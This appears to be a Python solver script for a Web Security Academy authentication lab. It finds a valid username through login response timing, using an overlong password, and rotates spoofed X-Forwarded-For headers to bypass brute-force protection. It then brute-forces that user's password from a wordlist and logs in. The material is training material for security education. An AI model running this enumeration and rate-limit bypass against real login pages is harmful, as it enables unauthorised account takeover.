from web_security_academy.core.logger import logger
from web_security_academy.core.utils import auth_lab_usernames, auth_lab_passwords
from time import perf_counter


def solve_lab(session):
    usernames = auth_lab_usernames()
    passwords = auth_lab_passwords()

    # User enumeration
    logger.info("Enumerating users by examining response times...")
    logger.toggle_newline()
    for i, user in enumerate(usernames):
        # Header used to bypass brute-force protection
        headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
        data = {"username": user, "password": "a" * 2048}

        start = perf_counter()
        resp = session.post_path("/login", data=data, headers=headers)
        end = perf_counter()

        response_time = end - start
        if response_time < 5:
            logger.info(f"{user} => {response_time} seconds")
        else:
            logger.success(f"{user} => {response_time} seconds")
            logger.toggle_newline()
            break
    else:
        logger.failure("Unable to enumerate a valid username.")
        logger.toggle_newline()
        return

    # Password enumeration
    logger.info(f"Brute-forcing {user}'s password...")
    logger.toggle_newline()
    for i, password in enumerate(passwords):
        headers = {"X-Forwarded-For": f"192.168.0.{i+1}"}
        data = {"username": user, "password": password}
        resp = session.post_path(
            "/login", data=data, headers=headers, allow_redirects=False
        )

        if resp.status_code != 302:
            logger.info(f"{password} => Incorrect")
        else:
            logger.success(f"{password} => Correct!")
            logger.toggle_newline()
            break
    else:
        logger.failure(f"Unable to brute-force {user}'s password.")
        logger.toggle_newline()
        return

    session.login(user, password, with_csrf=False)
